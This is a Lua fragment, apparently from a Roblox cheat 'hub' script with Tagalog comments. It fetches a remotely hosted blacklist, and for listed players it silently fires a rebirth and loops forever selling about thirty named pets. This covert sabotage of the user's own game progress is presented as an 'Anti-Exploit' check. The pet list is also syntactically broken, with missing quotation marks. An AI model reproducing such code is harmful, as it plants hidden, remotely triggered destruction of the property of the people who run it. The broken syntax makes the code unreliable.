-- ==========================================
-- BLACKLIST & CONFIGURATION SYSTEM (URL FETCH)
-- ==========================================
local HttpService = game:GetService("HttpService")

-- Palitan ito ng iyong actual URL (Dapat JSON format ang laman nito)
local BLACKLIST_URL = "https://slh-hub.lovable.app/raw/blacklist-json"

local blacklistedUsers = {}

-- Function para i-download/kunin ang blacklist mula sa link
local function loadBlacklist()
    local success, response = pcall(function()
        return HttpService:GetAsync(BLACKLIST_URL)
    end)
    
    if success then
        -- I-decode ang JSON response papuntang Lua table
        local decoded, data = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        
        if decoded and type(data) == "table" then
            blacklistedUsers = data
            print("Blacklist successfully loaded from URL!")
        else
            warn("Failed to decode blacklist JSON.")
        end
    else
        warn("Failed to fetch blacklist from URL: ", response)
    end
end

-- I-load ang blacklist pagka-start ng script
loadBlacklist()

local function isBlacklisted(player)
    for _, idOrName in ipairs(blacklistedUsers) do
        if type(idOrName) == "number" and player.UserId == idOrName then
            return true
        elseif type(idOrName) == "string" and player.Name:lower() == idOrName:lower() then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

-- ==========================================
-- KUNG BLACKLISTED: Auto-Rebirth & Auto-Sell AGAD (Walang Key System na lalabas)
-- ==========================================
if isBlacklisted(localPlayer) then
    print("[Anti-Exploit] Blacklisted player detected. Executing auto-rebirth and auto-sell...")
    
    -- 1. Auto-Rebirth
    pcall(function()
        game:GetService("ReplicatedStorage").remotes.rebirthRequest:FireServer()
    end)
    
    -- 2. Background Auto-Sell System
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local remotesFolder = ReplicatedStorage:FindFirstChild("remotes") or ReplicatedStorage:FindFirstChild("Remotes")
    local sellRemote = nil
    
    if remotesFolder then
        sellRemote = remotesFolder:FindFirstChild("sellPet") 
            or remotesFolder:FindFirstChild("SellPet") 
            or remotesFolder:FindFirstChild("sellRequest")
            or remotesFolder:FindFirstChild("SellRequest")
    end
    
    if sellRemote then
        local function startBackgroundAutoSell(petName)
            task.spawn(function()
                while true do
                    local p = Players.LocalPlayer
                    local petsFolder = p:FindFirstChild("PetsFolder") or p:FindFirstChild("Pets")
                    
                    if petsFolder and petsFolder:FindFirstChild(petName) then
                        pcall(function()
                            sellRemote:FireServer(petsFolder[petName])
                        end)
                    end
                    
                    task.wait(1)
                end
            end)
        end
        
        local petsToAutoSell = {
            "Cat", "Dog", "Rabbit", "Hamster", "Shark",
            "Wolf", "Fox", "MuscleMan", "Spike", "Bear",
            "Snow Wolf", "Forest Deer", "Fire Pup", "Shadow Wolf", "Thunder Bear",
            "Spirit Wolf", "Storm Tiger", "Lunar Dragon", "Crystal Dragon",
            "Pelican", "Divine Dragon", "Neon Divine Dragon", "Space Dragon",
            "Red Alien", "Fire Alien", "Vortex", "Astrax",
            "Rage Shark", Titan Crocodile", Battle Gorilla", "Champion Dragon"
        }
        
        for _, pet in ipairs(petsToAutoSell) do
            startBackgroundAutoSell(pet)
        end
    end
    
    -- I-terminate na ang script para hindi na lumabas ang UI sa mga Blacklisted
    return
end
